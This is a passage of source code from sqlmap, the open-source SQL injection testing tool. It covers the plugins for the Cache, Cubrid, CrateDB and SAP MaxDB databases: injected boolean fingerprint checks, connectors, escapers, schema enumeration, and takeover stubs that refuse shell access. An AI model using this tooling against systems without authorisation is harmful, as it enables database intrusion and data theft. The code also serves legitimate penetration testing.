fork:\n                value += \" (%s fork)\" % fork\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        if fork:\n            value += \"\\n%sfork fingerprint: %s\" % (blank, fork)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(CACHE_ALIASES):\n            setDbms(DBMS.CACHE)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.CACHE\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"$LISTLENGTH(NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.CACHE\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"%EXTERNAL %INTERNAL NULL IS NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.CACHE\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.CACHE)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.CACHE\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/cache/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Cache it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Cache it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Cache it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Cache it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/cache/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/cache/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import CACHE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.cache.enumeration import Enumeration\nfrom plugins.dbms.cache.filesystem import Filesystem\nfrom plugins.dbms.cache.fingerprint import Fingerprint\nfrom plugins.dbms.cache.syntax import Syntax\nfrom plugins.dbms.cache.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass CacheMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Cache methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = CACHE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.CACHE] = Syntax.escape\n", "plugins/dbms/cubrid/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on Cubrid it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on Cubrid it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Cubrid it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on Cubrid it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/cubrid/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import CUBRIDdb\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/CUBRID/cubrid-python\n    User guide: https://github.com/CUBRID/cubrid-python/blob/develop/README.md\n    API: https://www.python.org/dev/peps/pep-0249/\n    License: BSD License\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = CUBRIDdb.connect(hostname=self.hostname, username=self.user, password=self.password, database=self.db, port=self.port, connect_timeout=conf.timeout)\n        except CUBRIDdb.DatabaseError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except CUBRIDdb.DatabaseError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(query)\n        except CUBRIDdb.DatabaseError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except CUBRIDdb.Error as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/cubrid/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/cubrid/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import CUBRID_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CUBRID)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.CUBRID\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(CUBRID_ALIASES):\n            setDbms(DBMS.CUBRID)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.CUBRID\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"{} SUBSETEQ (CAST ({} AS SET))\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.CUBRID\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"DRAND()<2\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.CUBRID\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.CUBRID)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.CUBRID\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/cubrid/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Cubrid it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Cubrid it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Cubrid it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Cubrid it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/cubrid/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/cubrid/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import CUBRID_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.cubrid.enumeration import Enumeration\nfrom plugins.dbms.cubrid.filesystem import Filesystem\nfrom plugins.dbms.cubrid.fingerprint import Fingerprint\nfrom plugins.dbms.cubrid.syntax import Syntax\nfrom plugins.dbms.cubrid.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass CubridMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Cubrid methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = CUBRID_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.CUBRID] = Syntax.escape\n", "plugins/dbms/cratedb/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on CrateDB it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on CrateDB it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n", "plugins/dbms/cratedb/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import psycopg2\n    import psycopg2.extensions\n    psycopg2.extensions.register_type(psycopg2.extensions.UNICODE)\n    psycopg2.extensions.register_type(psycopg2.extensions.UNICODEARRAY)\nexcept:\n    pass\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://initd.org/psycopg/\n    User guide: http://initd.org/psycopg/docs/\n    API: http://initd.org/psycopg/docs/genindex.html\n    Debian package: python-psycopg2\n    License: GPL\n\n    Possible connectors: http://wiki.python.org/moin/PostgreSQL\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = psycopg2.connect(host=self.hostname, user=self.user, password=self.password, database=self.db, port=self.port)\n        except psycopg2.OperationalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.set_client_encoding('UNICODE')\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except psycopg2.ProgrammingError as ex:\n            logger.warning(getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(query)\n            retVal = True\n        except (psycopg2.OperationalError, psycopg2.ProgrammingError) as ex:\n            logger.warning((\"(remote) '%s'\" % getSafeExString(ex)).strip())\n        except psycopg2.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n        return retVal\n", "plugins/dbms/cratedb/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n\n        return expression\n", "plugins/dbms/cratedb/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import CRATEDB_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CRATEDB)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.CRATEDB\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(CRATEDB_ALIASES):\n            setDbms(DBMS.CRATEDB)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.CRATEDB\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"IGNORE3VL(NULL IS NULL)\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.CRATEDB\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"1~1\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.CRATEDB\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.CRATEDB)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.CRATEDB\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/cratedb/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on CrateDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on CrateDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on CrateDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on CrateDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/cratedb/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/cratedb/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import CRATEDB_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.cratedb.enumeration import Enumeration\nfrom plugins.dbms.cratedb.filesystem import Filesystem\nfrom plugins.dbms.cratedb.fingerprint import Fingerprint\nfrom plugins.dbms.cratedb.syntax import Syntax\nfrom plugins.dbms.cratedb.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass CrateDBMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines CrateDB methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = CRATEDB_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.CRATEDB] = Syntax.escape\n", "plugins/dbms/maxdb/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.common import isListLike\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import readInput\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.data import queries\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import CURRENT_DB\nfrom lib.utils.brute import columnExists\nfrom lib.utils.pivotdumptable import pivotDumpTable\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\nfrom thirdparty import six\nfrom thirdparty.six.moves import zip as _zip\n\nclass Enumeration(GenericEnumeration):\n    def __init__(self):\n        GenericEnumeration.__init__(self)\n\n        kb.data.processChar = lambda x: x.replace('_', ' ') if x else x\n\n    def getPasswordHashes(self):\n        warnMsg = \"on SAP MaxDB it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getDbs(self):\n        if len(kb.data.cachedDbs) > 0:\n            return kb.data.cachedDbs\n\n        infoMsg = \"fetching database names\"\n        logger.info(infoMsg)\n\n        rootQuery = queries[DBMS.MAXDB].dbs\n        query = rootQuery.inband.query\n        retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.schemaname' % kb.aliasName], blind=True)\n\n        if retVal:\n            kb.data.cachedDbs = next(six.itervalues(retVal[0]))\n\n        if kb.data.cachedDbs:\n            kb.data.cachedDbs.sort()\n\n        return kb.data.cachedDbs\n\n    def getTables(self, bruteForce=None):\n        if len(kb.data.cachedTables) > 0:\n            return kb.data.cachedTables\n\n        self.forceDbmsEnum()\n\n        if conf.db == CURRENT_DB:\n            conf.db = self.getCurrentDb()\n\n        if conf.db:\n            dbs = conf.db.split(',')\n        else:\n            dbs = self.getDbs()\n\n        for db in (_ for _ in dbs if _):\n            dbs[dbs.index(db)] = safeSQLIdentificatorNaming(db)\n\n        infoMsg = \"fetching tables for database\"\n        infoMsg += \"%s: %s\" % (\"s\" if len(dbs) > 1 else \"\", \", \".join(db if isinstance(db, six.string_types) else db[0] for db in sorted(dbs)))\n        logger.info(infoMsg)\n\n        rootQuery = queries[DBMS.MAXDB].tables\n\n        for db in dbs:\n            query = rootQuery.inband.query % ((\"'%s'\" % db) if db != \"USER\" else 'USER')\n            blind = not isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION)\n            retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.tablename' % kb.aliasName], blind=blind)\n\n            if retVal:\n                for table in list(retVal[0].values())[0]:\n                    if db not in kb.data.cachedTables:\n                        kb.data.cachedTables[db] = [table]\n                    else:\n                        kb.data.cachedTables[db].append(table)\n\n        for db, tables in kb.data.cachedTables.items():\n            kb.data.cachedTables[db] = sorted(tables) if tables else tables\n\n        return kb.data.cachedTables\n\n    def getColumns(self, onlyColNames=False, colTuple=None, bruteForce=None, dumpMode=False):\n        self.forceDbmsEnum()\n\n        if conf.db is None or conf.db == CURRENT_DB:\n            if conf.db is None:\n                warnMsg = \"missing database parameter. sqlmap is going \"\n                warnMsg += \"to use the current database to enumerate \"\n                warnMsg += \"table(s) columns\"\n                logger.warning(warnMsg)\n\n            conf.db = self.getCurrentDb()\n\n        elif conf.db is not None:\n            if ',' in conf.db:\n                errMsg = \"only one database name is allowed when enumerating \"\n                errMsg += \"the tables' columns\"\n                raise SqlmapMissingMandatoryOptionException(errMsg)\n\n        conf.db = safeSQLIdentificatorNaming(conf.db)\n\n        if conf.col:\n            colList = conf.col.split(',')\n        else:\n            colList = []\n\n        if conf.exclude:\n            colList = [_ for _ in colList if re.search(conf.exclude, _, re.I) is None]\n\n        for col in colList:\n            colList[colList.index(col)] = safeSQLIdentificatorNaming(col)\n\n        if conf.tbl:\n            tblList = conf.tbl.split(',')\n        else:\n            self.getTables()\n\n            if len(kb.data.cachedTables) > 0:\n                tblList = list(kb.data.cachedTables.values())\n\n                if tblList and isListLike(tblList[0]):\n                    tblList = tblList[0]\n            else:\n                errMsg = \"unable to retrieve the tables \"\n                errMsg += \"on database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                raise SqlmapNoneDataException(errMsg)\n\n        for tbl in tblList:\n            tblList[tblList.index(tbl)] = safeSQLIdentificatorNaming(tbl, True)\n\n        if bruteForce:\n            resumeAvailable = False\n\n            for tbl in tblList:\n                for db, table, colName, colType in kb.brute.columns:\n                    if db == conf.db and table == tbl:\n                        resumeAvailable = True\n                        break\n\n            if resumeAvailable and not conf.freshQueries or colList:\n                columns = {}\n\n                for column in colList:\n                    columns[column] = None\n\n                for tbl in tblList:\n                    for db, table, colName, colType in kb.brute.columns:\n                        if db == conf.db and table == tbl:\n                            columns[colName] = colType\n\n                    if conf.db in kb.data.cachedColumns:\n                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)] = columns\n                    else:\n                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = {safeSQLIdentificatorNaming(tbl, True): columns}\n\n                return kb.data.cachedColumns\n\n            message = \"do you want to use common column existence check? [y/N/q] \"\n            choice = readInput(message, default='Y' if 'Y' in message else 'N').upper()\n\n            if choice == 'N':\n                return\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n            else:\n                return columnExists(paths.COMMON_COLUMNS)\n\n        rootQuery = queries[DBMS.MAXDB].columns\n\n        for tbl in tblList:\n            if conf.db is not None and len(kb.data.cachedColumns) > 0 and conf.db in kb.data.cachedColumns and tbl in kb.data.cachedColumns[conf.db]:\n                infoMsg = \"fetched tables' columns on \"\n                infoMsg += \"database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                logger.info(infoMsg)\n\n                return {conf.db: kb.data.cachedColumns[conf.db]}\n\n            if dumpMode and colList:\n                table = {}\n                table[safeSQLIdentificatorNaming(tbl, True)] = dict((_, None) for _ in colList)\n                kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = table\n                continue\n\n            infoMsg = \"fetching columns \"\n            infoMsg += \"for table '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n            infoMsg += \"on database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n            logger.info(infoMsg)\n\n            blind = not isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION)\n\n            query = rootQuery.inband.query % (unsafeSQLIdentificatorNaming(tbl), (\"'%s'\" % unsafeSQLIdentificatorNaming(conf.db)) if unsafeSQLIdentificatorNaming(conf.db) != \"USER\" else 'USER')\n            retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.columnname' % kb.aliasName, '%s.datatype' % kb.aliasName, '%s.len' % kb.aliasName], blind=blind)\n\n            if retVal:\n                table = {}\n                columns = {}\n\n                for columnname, datatype, length in _zip(retVal[0][\"%s.columnname\" % kb.aliasName], retVal[0][\"%s.datatype\" % kb.aliasName], retVal[0][\"%s.len\" % kb.aliasName]):\n                    columns[safeSQLIdentificatorNaming(columnname)] = \"%s(%s)\" % (datatype, length)\n\n                table[tbl] = columns\n                kb.data.cachedColumns[conf.db] = table\n\n        return kb.data.cachedColumns\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on SAP MaxDB it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def search(self):\n        warnMsg = \"on SAP MaxDB search option is not available\"\n        logger.warning(warnMsg)\n\n    def getHostname(self):\n        warnMsg = \"on SAP MaxDB it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on SAP MaxDB it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/maxdb/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on SAP MaxDB it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/maxdb/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n\n        return expression\n", "plugins/dbms/maxdb/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import MAXDB_ALIASES\nfrom lib.request import 